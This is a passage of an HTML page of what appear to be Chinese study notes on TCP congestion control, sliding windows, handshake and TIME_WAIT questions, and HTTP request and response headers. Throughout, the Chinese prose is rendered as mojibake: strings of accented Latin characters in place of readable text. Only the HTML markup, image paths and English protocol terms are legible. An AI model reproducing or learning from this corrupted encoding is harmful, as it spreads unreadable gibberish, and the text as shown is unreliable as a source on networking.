”æ…¢å¼€å§‹ç®—æ³•çš„æ‹¥å¡å¢é•¿ç¼“æ…¢ã€‚</p></blockquote></li><li><p>å¿«é‡ä¼ </p><blockquote><p>è¿ç»­æ”¶åˆ°3ä¸ªé‡å¤ç¡®è®¤ï¼Œç«‹å³é‡ä¼ æ¥æ”¶æ–¹å°šæœªæ”¶åˆ°çš„æŠ¥æ–‡æ®µã€‚</p></blockquote></li><li><p>å¿«æ¢å¤ç®—æ³•</p><blockquote><p>å½“è¿ç»­æ”¶åˆ°3ä¸ªé‡å¤ç¡®è®¤ï¼Œæ‰§è¡Œä¹˜æ³•å‡å°ï¼Œé—¨é™å‡åŠã€‚</p></blockquote></li></ul><h3><span id="æ»‘åŠ¨çª—å£"><em>æ»‘åŠ¨çª—å£</em></span></h3><p>æˆ‘ä»¬èƒ½ä¸èƒ½æŠŠç¬¬ä¸€ä¸ªå’Œç¬¬äºŒä¸ªåŒ…å‘è¿‡å»åï¼Œæ”¶åˆ°ç¬¬ä¸€ä¸ªç¡®è®¤åŒ…å°±æŠŠç¬¬ä¸‰ä¸ªåŒ…å‘è¿‡å»å‘¢ï¼Ÿè€Œä¸æ˜¯å»ç­‰åˆ°ç¬¬äºŒä¸ªåŒ…çš„ç¡®è®¤åŒ…æ‰å»å‘ç¬¬ä¸‰ä¸ªåŒ…ã€‚è¿™æ ·å°±å¾ˆè‡ªç„¶çš„äº§ç”Ÿäº†æˆ‘ä»¬â€æ»‘åŠ¨çª—å£â€çš„å®ç°ã€‚</p><p><img src="/2020/03/30/Network/clip_image002-1585536742055.png"></p><p>åœ¨å›¾ä¸­ï¼Œæˆ‘ä»¬å¯çœ‹å‡ºç°è‰²1å·2å·3å·åŒ…å·²ç»å‘é€å®Œæ¯•ï¼Œå¹¶ä¸”å·²ç»æ”¶åˆ°Ackã€‚è¿™äº›åŒ…å°±å·²ç»æ˜¯è¿‡å»å¼ã€‚4ã€5ã€6ã€7å·åŒ…æ˜¯é»„è‰²çš„ï¼Œè¡¨ç¤ºå·²ç»å‘é€äº†ã€‚ä½†æ˜¯å¹¶æ²¡æœ‰æ”¶åˆ°å¯¹æ–¹çš„Ackï¼Œæ‰€ä»¥ä¹Ÿä¸çŸ¥é“æ¥æ”¶æ–¹æœ‰æ²¡æœ‰æ”¶åˆ°ã€‚8ã€9ã€10å·åŒ…æ˜¯ç»¿è‰²çš„ã€‚æ˜¯æˆ‘ä»¬è¿˜æ²¡æœ‰å‘é€çš„ã€‚è¿™äº›ç»¿è‰²ä¹Ÿå°±æ˜¯æˆ‘ä»¬æ¥ä¸‹æ¥é©¬ä¸Šè¦å‘é€çš„åŒ…ã€‚ å¯ä»¥çœ‹å‡ºæˆ‘ä»¬çš„çª—å£æ­£å¥½æ˜¯11æ ¼ã€‚åé¢çš„11-16è¿˜æ²¡æœ‰è¢«è¯»è¿›å†…å­˜ã€‚è¦ç­‰4å·-10å·åŒ…æœ‰æ¥ä¸‹æ¥çš„åŠ¨ä½œåï¼Œæˆ‘ä»¬çš„åŒ…æ‰ä¼šç»§ç»­å¾€ä¸‹å‘é€ã€‚</p><p><strong>æ­£å¸¸æƒ…å†µ</strong></p><p><img src="/2020/03/30/Network/clip_image004.png"></p><p>å¯ä»¥çœ‹åˆ°4å·åŒ…å¯¹æ–¹å·²ç»è¢«æ¥æ”¶åˆ°ï¼Œæ‰€ä»¥è¢«æ¶‚æˆäº†ç°è‰²ã€‚â€œçª—å£â€å°±å¾€å³ç§»ä¸€æ ¼ï¼Œè¿™é‡Œåªè¦ä¿è¯â€œçª—å£â€æ˜¯7æ ¼çš„ã€‚ æˆ‘ä»¬å°±æŠŠ11å·åŒ…è¯»è¿›äº†æˆ‘ä»¬çš„ç¼“å­˜ã€‚è¿›å…¥äº†â€œå¾…å‘é€â€çš„çŠ¶æ€ã€‚8ã€9å·åŒ…å·²ç»å˜æˆäº†é»„è‰²ï¼Œè¡¨ç¤ºå·²ç»å‘é€å‡ºå»äº†ã€‚æ¥ä¸‹æ¥çš„æ“ä½œå°±æ˜¯ä¸€æ ·çš„äº†ï¼Œç¡®è®¤åŒ…åï¼Œçª—å£å¾€åç§»ç»§ç»­å°†æœªå‘é€çš„åŒ…è¯»è¿›ç¼“å­˜ï¼ŒæŠŠâ€œå¾…å‘é€â€œçŠ¶æ€çš„åŒ…å˜ä¸ºâ€å·²å‘é€â€œã€‚</p><p><strong>ä¸¢åŒ…æƒ…å†µ</strong></p><p>æœ‰å¯èƒ½æˆ‘ä»¬åŒ…å‘è¿‡å»ï¼Œå¯¹æ–¹çš„Ackä¸¢äº†ã€‚ä¹Ÿæœ‰å¯èƒ½æˆ‘ä»¬çš„åŒ…å¹¶æ²¡æœ‰å‘é€è¿‡å»ã€‚ä»å‘é€æ–¹è§’åº¦çœ‹å°±æ˜¯æˆ‘ä»¬æ²¡æœ‰æ”¶åˆ°Ackã€‚</p><p><img src="/2020/03/30/Network/clip_image006.png"></p><p>å‘ç”Ÿçš„æƒ…å†µï¼šä¸€ç›´åœ¨ç­‰Ackã€‚å¦‚æœä¸€ç›´ç­‰ä¸åˆ°çš„è¯ï¼Œæˆ‘ä»¬ä¹Ÿä¼šæŠŠè¯»è¿›ç¼“å­˜çš„å¾…å‘é€çš„åŒ…ä¹Ÿä¸€èµ·å‘è¿‡å»ã€‚ä½†æ˜¯ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬çš„çª—å£å·²ç»å‘æ»¡äº†ã€‚æ‰€ä»¥å¹¶ä¸èƒ½æŠŠ12å·åŒ…è¯»è¿›æ¥ï¼Œè€Œæ˜¯å§‹ç»ˆåœ¨ç­‰å¾…5å·åŒ…çš„Ackã€‚</p><p>å¦‚æœæˆ‘ä»¬è¿™ä¸ªAckå§‹ç»ˆä¸æ¥æ€ä¹ˆåŠå‘¢ï¼Ÿ</p><p><strong>è¶…æ—¶é‡å‘</strong></p><p>è¿™æ—¶å€™æˆ‘ä»¬æœ‰ä¸ªè§£å†³æ–¹æ³•ï¼šè¶…æ—¶é‡ä¼ <br> è¿™é‡Œæœ‰ä¸€ç‚¹è¦è¯´æ˜ï¼šè¿™ä¸ªAckæ˜¯è¦æŒ‰é¡ºåºçš„ã€‚å¿…é¡»è¦ç­‰åˆ°5çš„Ackæ”¶åˆ°ï¼Œæ‰ä¼šæŠŠ6-11çš„Ackå‘é€è¿‡å»ã€‚è¿™æ ·å°±ä¿è¯äº†æ»‘åŠ¨çª—å£çš„ä¸€ä¸ªé¡ºåºã€‚</p><p><img src="/2020/03/30/Network/clip_image008.png"></p><p>è¿™æ—¶å€™å¯ä»¥çœ‹å‡º5å·åŒ…å·²ç»æ¥å—åˆ°Ackï¼Œåé¢çš„6ã€7ã€8å·åŒ…ä¹Ÿå·²ç»å‘é€è¿‡å»å·²Ackã€‚çª—å£ä¾¿ç»§ç»­å‘åç§»åŠ¨ã€‚</p><p><img src="/2020/03/30/Network/clip_image009.png"></p><h5><span id="å®šä¹‰"><em>å®šä¹‰</em></span></h5><p>RTTï¼šå‘é€ä¸€ä¸ªæ•°æ®åŒ…åˆ°æ”¶åˆ°å¯¹åº”ACKæ‰€èŠ±è´¹çš„æ—¶é—´</p><p>RTO: é‡ä¼ æ—¶é—´é—´éš”</p><h5><span id="ä½œç”¨"><em>ä½œç”¨</em></span></h5><p>ä¿è¯äº†TCPçš„å¯é æ€§</p><p>ä¿è¯TCPçš„æµæ§ç‰¹æ€§</p><p><img src="/2020/03/30/Network/clip_image011.jpg"></p><p>LastByteAckedï¼šå·²å‘é€å¹¶å·²æ”¶åˆ°ACK</p><p>LastByteSentï¼š å·²å‘é€æœªæ”¶åˆ°ACK</p><p>LastByteWrittenï¼š æœªå‘é€çš„åŒ…ï¼ˆå½“å‰ç¨‹åºå‡†å¤‡å¥½çš„æ•°æ®ï¼‰</p><p>LastByteReadï¼šä¸Šå±‚åº”ç”¨è¯»å®Œæ”¶åˆ°ä¸”å‘é€ACKçš„</p><p>NextByteExpectedï¼šå·²æ”¶åˆ°ä½†æ˜¯æœªå‘é€ACK</p><p>LastByteRcvdï¼šå·²æ”¶åˆ°çš„æœ€åä¸€ä¸ªå­—èŠ‚çš„ä½ç½®ï¼ˆå¯èƒ½æœ‰äº›seqæœªåˆ°è¾¾ï¼‰</p><p>AdvertiseWindowï¼š æ¥æ”¶æ–¹èƒ½æ¥æ”¶ï¼ˆå¤„ç†ï¼‰çš„å¤§å°</p><p>EffectiveWindowï¼š å‘é€æ–¹è¿˜å¯ä»¥å‘é€çš„æ•°æ®</p><h3><span id="å¸¸è§é—®é¢˜"><em>å¸¸è§é—®é¢˜ï¼š</em></span></h3><p>ã€é—®é¢˜1ã€‘ä¸ºä»€ä¹ˆè¿æ¥çš„æ—¶å€™æ˜¯ä¸‰æ¬¡æ¡æ‰‹ï¼Œå…³é—­çš„æ—¶å€™å´æ˜¯å››æ¬¡æ¡æ‰‹ï¼Ÿ </p><p>ç­”ï¼šå› ä¸ºå½“Serverç«¯æ”¶åˆ°Clientç«¯çš„SYNè¿æ¥è¯·æ±‚æŠ¥æ–‡åï¼Œå¯ä»¥ç›´æ¥å‘é€SYN+ACKæŠ¥æ–‡ã€‚å…¶ä¸­ACKæŠ¥æ–‡æ˜¯ç”¨æ¥åº”ç­”çš„ï¼ŒSYNæŠ¥æ–‡æ˜¯ç”¨æ¥åŒæ­¥çš„ã€‚ä½†æ˜¯å…³é—­è¿æ¥æ—¶ï¼Œå½“Serverç«¯æ”¶åˆ°FINæŠ¥æ–‡æ—¶ï¼Œå¾ˆå¯èƒ½å¹¶ä¸ä¼šç«‹å³å…³é—­SOCKETï¼Œæ‰€ä»¥åªèƒ½å…ˆå›å¤ä¸€ä¸ªACKæŠ¥æ–‡ï¼Œå‘Šè¯‰Clientç«¯ï¼Œâ€ä½ å‘çš„FINæŠ¥æ–‡æˆ‘æ”¶åˆ°äº†â€ã€‚åªæœ‰ç­‰åˆ°æˆ‘Serverç«¯æ‰€æœ‰çš„æŠ¥æ–‡éƒ½å‘é€å®Œäº†ï¼Œæˆ‘æ‰èƒ½å‘é€FINæŠ¥æ–‡ï¼Œå› æ­¤ä¸èƒ½ä¸€èµ·å‘é€ã€‚æ•…éœ€è¦å››æ­¥æ¡æ‰‹ã€‚</p><p>ã€é—®é¢˜2ã€‘ä¸ºä»€ä¹ˆTIME_WAITçŠ¶æ€éœ€è¦ç»è¿‡2MSL(æœ€å¤§æŠ¥æ–‡æ®µç”Ÿå­˜æ—¶é—´)æ‰èƒ½è¿”å›åˆ°CLOSEçŠ¶æ€ï¼Ÿ </p><p>ç­”ï¼šè™½ç„¶æŒ‰é“ç†ï¼Œå››ä¸ªæŠ¥æ–‡éƒ½å‘é€å®Œæ¯•ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥è¿›å…¥CLOSEçŠ¶æ€äº†ï¼Œä½†æ˜¯æˆ‘ä»¬å¿…é¡»å‡æƒ³ç½‘ç»œæ˜¯ä¸å¯é çš„ï¼Œæœ‰å¯èƒ½æœ€åä¸€ä¸ªACKä¸¢å¤±ã€‚æ‰€ä»¥TIME_WAITçŠ¶æ€å°±æ˜¯ç”¨æ¥é‡å‘å¯èƒ½ä¸¢å¤±çš„ACKæŠ¥æ–‡ã€‚åœ¨Clientå‘é€å‡ºæœ€åçš„ACKå›å¤ï¼Œä½†è¯¥ACKå¯èƒ½ä¸¢å¤±ã€‚Serverå¦‚æœæ²¡æœ‰æ”¶åˆ°ACKï¼Œå°†ä¸æ–­é‡å¤å‘é€FINç‰‡æ®µã€‚æ‰€ä»¥Clientä¸èƒ½ç«‹å³å…³é—­ï¼Œå®ƒå¿…é¡»ç¡®è®¤Serveræ¥æ”¶åˆ°äº†è¯¥ACKã€‚Clientä¼šåœ¨å‘é€å‡ºACKä¹‹åè¿›å…¥åˆ°TIME_WAITçŠ¶æ€ã€‚Clientä¼šè®¾ç½®ä¸€ä¸ªè®¡æ—¶å™¨ï¼Œç­‰å¾…2MSLçš„æ—¶é—´ã€‚å¦‚æœåœ¨è¯¥æ—¶é—´å†…å†æ¬¡æ”¶åˆ°FINï¼Œé‚£ä¹ˆClientä¼šé‡å‘ACKå¹¶å†æ¬¡ç­‰å¾…2MSLã€‚æ‰€è°“çš„2MSLæ˜¯ä¸¤å€çš„MSL(Maximum Segment Lifetime)ã€‚MSLæŒ‡ä¸€ä¸ªç‰‡æ®µåœ¨ç½‘ç»œä¸­æœ€å¤§çš„å­˜æ´»æ—¶é—´ï¼Œ2MSLå°±æ˜¯ä¸€ä¸ªå‘é€å’Œä¸€ä¸ªå›å¤æ‰€éœ€çš„æœ€å¤§æ—¶é—´ã€‚å¦‚æœç›´åˆ°2MSLï¼ŒClientéƒ½æ²¡æœ‰å†æ¬¡æ”¶åˆ°FINï¼Œé‚£ä¹ˆClientæ¨æ–­ACKå·²ç»è¢«æˆåŠŸæ¥æ”¶ï¼Œåˆ™ç»“æŸTCPè¿æ¥ã€‚</p><p>ã€é—®é¢˜3ã€‘ä¸ºä»€ä¹ˆä¸èƒ½ç”¨ä¸¤æ¬¡æ¡æ‰‹è¿›è¡Œè¿æ¥ï¼Ÿ </p><p>ç­”ï¼š3æ¬¡æ¡æ‰‹å®Œæˆä¸¤ä¸ªé‡è¦çš„åŠŸèƒ½ï¼Œæ—¢è¦åŒæ–¹åšå¥½å‘é€æ•°æ®çš„å‡†å¤‡å·¥ä½œ(åŒæ–¹éƒ½çŸ¥é“å½¼æ­¤å·²å‡†å¤‡å¥½)ï¼Œä¹Ÿè¦å…è®¸åŒæ–¹å°±åˆå§‹åºåˆ—å·è¿›è¡Œåå•†ï¼Œè¿™ä¸ªåºåˆ—å·åœ¨æ¡æ‰‹è¿‡ç¨‹ä¸­è¢«å‘é€å’Œç¡®è®¤ã€‚</p><p>â€‹    ç°åœ¨æŠŠä¸‰æ¬¡æ¡æ‰‹æ”¹æˆä»…éœ€è¦ä¸¤æ¬¡æ¡æ‰‹ï¼Œæ­»é”æ˜¯å¯èƒ½å‘ç”Ÿçš„ã€‚ä½œä¸ºä¾‹å­ï¼Œè€ƒè™‘è®¡ç®—æœºSå’ŒCä¹‹é—´çš„é€šä¿¡ï¼Œå‡å®šCç»™Så‘é€ä¸€ä¸ªè¿æ¥è¯·æ±‚åˆ†ç»„ï¼ŒSæ”¶åˆ°äº†è¿™ä¸ªåˆ†ç»„ï¼Œå¹¶å‘ é€äº†ç¡®è®¤åº”ç­”åˆ†ç»„ã€‚æŒ‰ç…§ä¸¤æ¬¡æ¡æ‰‹çš„åå®šï¼ŒSè®¤ä¸ºè¿æ¥å·²ç»æˆåŠŸåœ°å»ºç«‹äº†ï¼Œå¯ä»¥å¼€å§‹å‘é€æ•°æ®åˆ†ç»„ã€‚å¯æ˜¯ï¼ŒCåœ¨Sçš„åº”ç­”åˆ†ç»„åœ¨ä¼ è¾“ä¸­è¢«ä¸¢å¤±çš„æƒ…å†µä¸‹ï¼Œå°†ä¸çŸ¥é“S æ˜¯å¦å·²å‡†å¤‡å¥½ï¼Œä¸çŸ¥é“Så»ºç«‹ä»€ä¹ˆæ ·çš„åºåˆ—å·ï¼ŒCç”šè‡³æ€€ç–‘Sæ˜¯å¦æ”¶åˆ°è‡ªå·±çš„è¿æ¥è¯·æ±‚åˆ†ç»„ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒCè®¤ä¸ºè¿æ¥è¿˜æœªå»ºç«‹æˆåŠŸï¼Œå°†å¿½ç•¥Så‘æ¥çš„ä»»ä½•æ•°æ®åˆ† ç»„ï¼Œåªç­‰å¾…è¿æ¥ç¡®è®¤åº”ç­”åˆ†ç»„ã€‚è€ŒSåœ¨å‘å‡ºçš„åˆ†ç»„è¶…æ—¶åï¼Œé‡å¤å‘é€åŒæ ·çš„åˆ†ç»„ã€‚è¿™æ ·å°±å½¢æˆäº†æ­»é”ã€‚</p><p>ã€é—®é¢˜4ã€‘å¦‚æœå·²ç»å»ºç«‹äº†è¿æ¥ï¼Œä½†æ˜¯å®¢æˆ·ç«¯çªç„¶å‡ºç°æ•…éšœäº†æ€ä¹ˆåŠï¼Ÿ </p><p>TCPè¿˜è®¾æœ‰ä¸€ä¸ªä¿æ´»è®¡æ—¶å™¨ï¼Œæ˜¾ç„¶ï¼Œå®¢æˆ·ç«¯å¦‚æœå‡ºç°æ•…éšœï¼ŒæœåŠ¡å™¨ä¸èƒ½ä¸€ç›´ç­‰ä¸‹å»ï¼Œç™½ç™½æµªè´¹èµ„æºã€‚æœåŠ¡å™¨æ¯æ”¶åˆ°ä¸€æ¬¡å®¢æˆ·ç«¯çš„è¯·æ±‚åéƒ½ä¼šé‡æ–°å¤ä½è¿™ä¸ªè®¡æ—¶å™¨ï¼Œæ—¶é—´é€šå¸¸æ˜¯è®¾ç½®ä¸º2å°æ—¶ï¼Œè‹¥ä¸¤å°æ—¶è¿˜æ²¡æœ‰æ”¶åˆ°å®¢æˆ·ç«¯çš„ä»»ä½•æ•°æ®ï¼ŒæœåŠ¡å™¨å°±ä¼šå‘é€ä¸€ä¸ªæ¢æµ‹æŠ¥æ–‡æ®µï¼Œä»¥åæ¯éš”75ç§’é’Ÿå‘é€ä¸€æ¬¡ã€‚è‹¥ä¸€è¿å‘é€10ä¸ªæ¢æµ‹æŠ¥æ–‡ä»ç„¶æ²¡ååº”ï¼ŒæœåŠ¡å™¨å°±è®¤ä¸ºå®¢æˆ·ç«¯å‡ºäº†æ•…éšœï¼Œæ¥ç€å°±å…³é—­è¿æ¥ã€‚</p><h2><span id="http">HTTP</span></h2><h3><span id="ä¸»è¦ç‰¹ç‚¹">ä¸»è¦ç‰¹ç‚¹ âˆš</span></h3><p>Ã˜ æ”¯æŒå®¢æˆ·&#x2F;æœåŠ¡å™¨æ¨¡å¼</p><p>Ã˜ ç®€å•å¿«é€Ÿ</p><p>Ã˜ çµæ´»</p><p>Ã˜ æ— è¿æ¥</p><p>Ã˜ æ— çŠ¶æ€</p><h2><span id="è¯·æ±‚å“åº”çš„æ­¥éª¤">è¯·æ±‚\å“åº”çš„æ­¥éª¤</span></h2><p>Ã˜ å®¢æˆ·ç«¯è¿æ¥åˆ°WebæœåŠ¡å™¨</p><p>é€šå¸¸æ˜¯æµè§ˆå™¨ï¼Œå‘webæœåŠ¡å™¨ç«¯å£ï¼ˆé»˜è®¤æ˜¯80ï¼‰å»ºç«‹ä¸€ä¸ªTCPå¥—æ¥å­—è¿æ¥</p><p>Ã˜ å‘é€HTTPè¯·æ±‚</p><p>åŒ…å«è¯·æ±‚è¡Œ-è¯·æ±‚å¤´éƒ¨-è¯·æ±‚æ•°æ®</p><p>Ã˜ æœåŠ¡å™¨æ¥æ”¶è¯·æ±‚å¹¶è¿”å›HTTPå“åº”</p><p>å“åº”è¡Œ-å“åº”å¤´éƒ¨-å“åº”æ­£æ–‡</p><p>Ã˜ é‡Šæ”¾TCPè¿æ¥</p><p>å¦‚æœä¸ºclosed æœåŠ¡å™¨ä¸»åŠ¨å…³é—­è¿æ¥ï¼Œè‹¥ä¸ºkeep-aliveä¼šä¿æŒä¸€æ®µæ—¶é—´ï¼Œè¯¥æ—¶é—´å†…ç»§ç»­æ¥æ”¶è¯·æ±‚</p><p>Ã˜ å®¢æˆ·ç«¯æµè§ˆå™¨è§£æHTMLå†…å®¹</p><h2><span id="åœ¨æµè§ˆå™¨é”®å…¥urlæŒ‰ä¸‹å›è½¦ä¹‹åçš„æµç¨‹é¢è¯•">åœ¨æµè§ˆå™¨é”®å…¥URLï¼ŒæŒ‰ä¸‹å›è½¦ä¹‹åçš„æµç¨‹ï¼ˆé¢è¯•ï¼‰</span></h2><p>Ã˜ æµè§ˆå™¨ä¼šæ ¹æ®URLé€å±‚æŸ¥è¯¢DNSæœåŠ¡å™¨ç¼“å­˜ï¼Œè§£æURLä¸­çš„åŸŸåå¯¹åº”çš„IPåœ°å€ã€‚</p><p>ä»è¿‘åˆ°è¿œä¾æ¬¡æ˜¯æµè§ˆå™¨ç¼“å­˜ã€ç³»ç»Ÿç¼“å­˜ï¼ˆhostï¼‰ã€è·¯ç”±å™¨ç¼“å­˜ã€ISPæœåŠ¡å™¨ç¼“å­˜ã€æ ¹åŸŸåæœåŠ¡å™¨ç¼“å­˜ã€é¡¶çº§åŸŸåæœåŠ¡å™¨ç¼“å­˜ä»å“ªä¸ªç¼“å­˜æ‰¾åˆ°æœåŠ¡å™¨ipå°±ç›´æ¥è¿”å›ï¼Œä¸å†æŸ¥è¯¢ã€‚</p><p>Ã˜ æ ¹æ®IPåœ°å€å’Œå¯¹åº”ç«¯å£å»ºç«‹TCPè¿æ¥ï¼ˆ3æ¬¡æ¡æ‰‹ï¼‰</p><p>Ã˜ æµè§ˆå™¨å‘é€HTTPè¯·æ±‚</p><p>åŒ…å«è¯·æ±‚è¡Œ-è¯·æ±‚å¤´éƒ¨-è¯·æ±‚æ•°æ®</p><p>Ã˜ æœåŠ¡å™¨å¤„ç†è¯·æ±‚å¹¶è¿”å›HTTPæŠ¥æ–‡</p><p>åŒ…å«å“åº”è¡Œ-å“åº”å¤´éƒ¨-å“åº”æ­£æ–‡</p><p>Ã˜ æµè§ˆå™¨è§£ææ¸²æŸ“é¡µé¢</p><p>Ã˜ è¿æ¥ç»“æŸ</p><h3><span id="è¯·æ±‚ç»“æ„è¯·æ±‚è¡Œ-è¯·æ±‚å¤´éƒ¨-è¯·æ±‚æ•°æ®">è¯·æ±‚ç»“æ„ï¼ˆè¯·æ±‚è¡Œ-è¯·æ±‚å¤´éƒ¨-è¯·æ±‚æ•°æ®ï¼‰</span></h3><h4><span id="é¦–å…ˆçœ‹çœ‹httpè¯·æ±‚æ¶ˆæ¯å°±æ˜¯æµè§ˆå™¨ä¸¢ç»™æœåŠ¡å™¨çš„">é¦–å…ˆçœ‹çœ‹httpè¯·æ±‚æ¶ˆæ¯ï¼ˆå°±æ˜¯æµè§ˆå™¨ä¸¢ç»™æœåŠ¡å™¨çš„ï¼‰ï¼š</span></h4><p><img src="/2020/03/30/Network/clip_image001.png">  </p><h4><span id="è¯·æ±‚è¡Œ">è¯·æ±‚è¡Œ</span></h4><p>æ ¼å¼ä¸ºï¼š</p><p>Method Request-URI HTTP-Version ç»“å°¾ç¬¦</p><p>ç»“å°¾ç¬¦ä¸€èˆ¬ç”¨\r\n</p><h4><span id="è¯·æ±‚å¤´"><strong>è¯·æ±‚å¤´</strong></span></h4><p><strong>é€šç”¨æŠ¥å¤´</strong></p><p>æ—¢å¯ä»¥å‡ºç°åœ¨è¯·æ±‚æŠ¥å¤´ï¼Œä¹Ÿå¯ä»¥å‡ºç°åœ¨å“åº”æŠ¥å¤´ä¸­</p><p>Dateï¼šè¡¨ç¤ºæ¶ˆæ¯äº§ç”Ÿçš„æ—¥æœŸå’Œæ—¶é—´</p><p>Connectionï¼šå…è®¸å‘é€æŒ‡å®šè¿æ¥çš„é€‰é¡¹ï¼Œä¾‹å¦‚æŒ‡å®šè¿æ¥æ˜¯è¿ç»­çš„ï¼Œæˆ–è€…æŒ‡å®šâ€œcloseâ€é€‰é¡¹ï¼Œé€šçŸ¥æœåŠ¡å™¨ï¼Œåœ¨å“åº”å®Œæˆåï¼Œå…³é—­è¿æ¥</p><p>Cache-Controlï¼šç”¨äºæŒ‡å®šç¼“å­˜æŒ‡ä»¤ï¼Œç¼“å­˜æŒ‡ä»¤æ˜¯å•å‘çš„ï¼ˆå“åº”ä¸­å‡ºç°çš„ç¼“å­˜æŒ‡ä»¤åœ¨è¯·æ±‚ä¸­æœªå¿…ä¼šå‡ºç°ï¼‰ï¼Œä¸”æ˜¯ç‹¬ç«‹çš„ï¼ˆä¸€ä¸ªæ¶ˆæ¯çš„ç¼“å­˜æŒ‡ä»¤ä¸ä¼šå½±å“å¦ä¸€ä¸ªæ¶ˆæ¯å¤„ç†çš„ç¼“å­˜æœºåˆ¶ï¼‰</p><p><strong>è¯·æ±‚æŠ¥å¤´</strong></p><p>è¯·æ±‚æŠ¥å¤´é€šçŸ¥æœåŠ¡å™¨å…³äºå®¢æˆ·ç«¯æ±‚æ±‚çš„ä¿¡æ¯ï¼Œå…¸å‹çš„è¯·æ±‚å¤´æœ‰ï¼š</p><p>Hostï¼šè¯·æ±‚çš„ä¸»æœºåï¼Œå…è®¸å¤šä¸ªåŸŸååŒå¤„ä¸€ä¸ªIPåœ°å€ï¼Œå³è™šæ‹Ÿä¸»æœº</p><p>User-Agentï¼šå‘é€è¯·æ±‚çš„æµè§ˆå™¨ç±»å‹ã€æ“ä½œç³»ç»Ÿç­‰ä¿¡æ¯</p><p>Acceptï¼šå®¢æˆ·ç«¯å¯è¯†åˆ«çš„å†…å®¹ç±»å‹åˆ—è¡¨ï¼Œç”¨äºæŒ‡å®šå®¢æˆ·ç«¯æ¥æ”¶é‚£äº›ç±»å‹çš„ä¿¡æ¯</p><p>Accept-Encodingï¼šå®¢æˆ·ç«¯å¯è¯†åˆ«çš„æ•°æ®ç¼–ç </p><p>Accept-Languageï¼šè¡¨ç¤ºæµè§ˆå™¨æ‰€æ”¯æŒçš„è¯­è¨€ç±»å‹</p><p>Connectionï¼šå…è®¸å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨æŒ‡å®šä¸è¯·æ±‚&#x2F;å“åº”è¿æ¥æœ‰å…³çš„é€‰é¡¹ï¼Œä¾‹å¦‚è¿™æ˜¯ä¸ºKeep-Aliveåˆ™è¡¨ç¤ºä¿æŒè¿æ¥ã€‚</p><p>Transfer-Encodingï¼šå‘ŠçŸ¥æ¥æ”¶ç«¯ä¸ºäº†ä¿è¯æŠ¥æ–‡çš„å¯é ä¼ è¾“ï¼Œå¯¹æŠ¥æ–‡é‡‡ç”¨äº†ä»€ä¹ˆç¼–ç æ–¹å¼ã€‚</p><h3><span id="å“åº”ç»“æ„çŠ¶æ€è¡Œ-å“åº”å¤´éƒ¨-å“åº”æ­£æ–‡"><em>å“åº”ç»“æ„ï¼ˆçŠ¶æ€è¡Œ-å“åº”å¤´éƒ¨-å“åº”æ­£æ–‡ï¼‰</em></span></h3><p><img src="/2020/03/30/Network/clip_image002-1585537261410.png"> </p><p><strong>çŠ¶æ€è¡Œ</strong></p><p>ç”±HTTP åè®®ç‰ˆæœ¬å­—æ®µã€çŠ¶ç ï¼ˆå¦‚404ï¼‰å’ŒçŠ¶æ€ç çš„æè¿°æ–‡æœ¬3ä¸ªéƒ¨åˆ†ç»„æˆ</p><p><strong>å“åº”æŠ¥å¤´</strong></p><p>ç”¨äºæœåŠ¡å™¨ä¼ é€’è‡ªèº«ä¿¡æ¯çš„å“åº”ï¼Œå¸¸è§çš„å“åº”æŠ¥å¤´ï¼š</p><p>Locationï¼šç”¨äºé‡å®šå‘æ¥å—è€…åˆ°ä¸€ä¸ªæ–°çš„ä½ç½®ï¼Œå¸¸ç”¨åœ¨æ›´æ¢åŸŸåçš„æ—¶å€™</p><p>Serverï¼šåŒ…å«å¯æœåŠ¡å™¨ç”¨æ¥å¤„ç†è¯·æ±‚çš„ç³»ç»Ÿä¿¡æ¯ï¼Œä¸User-Agentè¯·æ±‚æŠ¥å¤´æ˜¯ç›¸å¯¹åº”çš„</p><p><strong>å®ä½“æŠ¥å¤´</strong></p><p>å®ä½“æŠ¥å¤´ç”¨æ¥å®šäºè¢«ä¼ é€èµ„æºçš„ä¿¡æ¯ï¼Œæ—¢å¯ä»¥ç”¨äºè¯·æ±‚ä¹Ÿå¯ç”¨äºå“åº”ã€‚è¯·æ±‚å’Œå“åº”æ¶ˆæ¯éƒ½å¯ä»¥ä¼ é€ä¸€ä¸ªå®ä½“ï¼Œå¸¸è§çš„å®ä½“æŠ¥å¤´ä¸ºï¼š</p><p>Content-Typeï¼šå‘é€ç»™æ¥æ”¶è€…çš„å®ä½“æ­£æ–‡çš„åª’ä½“ç±»å‹</p><p>Content-Lenghtï¼šå®ä½“æ­£æ–‡çš„é•¿åº¦</p><p>Content-Languageï¼šæè¿°èµ„æºæ‰€ç”¨çš„è‡ªç„¶è¯­è¨€ï¼Œæ²¡æœ‰è®¾ç½®åˆ™è¯¥é€‰é¡¹åˆ™è®¤ä¸ºå®ä½“å†…å®¹å°†æä¾›ç»™æ‰€æœ‰çš„è¯­è¨€é˜…è¯»</p><p>Content-Encodingï¼šå®ä½“æŠ¥å¤´è¢«ç”¨ä½œåª’ä½“ç±»å‹çš„ä¿®é¥°ç¬¦ï¼Œå®ƒçš„å€¼æŒ‡ç¤ºäº†å·²ç»è¢«åº”ç”¨åˆ°å®ä½“æ­£æ–‡çš„é™„åŠ å†…å®¹çš„ç¼–ç ï¼Œå› è€Œè¦è·å¾—Content-TypeæŠ¥å¤´åŸŸä¸­æ‰€å¼•ç”¨çš„åª’ä½“ç±»å‹ï¼Œå¿…é¡»é‡‡ç”¨ç›¸åº”çš„è§£ç æœºåˆ¶ã€‚</p><p>Last-Modifiedï¼šå®ä½“æŠ¥å¤´ç”¨äºæŒ‡ç¤ºèµ„æºçš„æœ€åä¿®æ”¹æ—¥æœŸå’Œæ—¶é—´</p><p>Expiresï¼šå®ä½“æŠ¥å¤´ç»™å‡ºå“åº”è¿‡æœŸçš„æ—¥æœŸå’Œæ—¶é—´</p><p>ç©ºè¡Œ</p><p>httpåè®®è§„å®šçš„æ ¼å¼ï¼Œä¸€èˆ¬é‡‡ç”¨\r\n</p><h3><span id="keep-aliveæ¨¡å¼"><em>Keep-Aliveæ¨¡å¼</em></span></h3><p>ç”±ä¸Šé¢çš„ç¤ºä¾‹å¯ä»¥çœ‹åˆ°é‡Œé¢çš„è¯·æ±‚å¤´éƒ¨å’Œå“åº”å¤´éƒ¨éƒ½æœ‰ä¸€ä¸ªkey-value Connection: 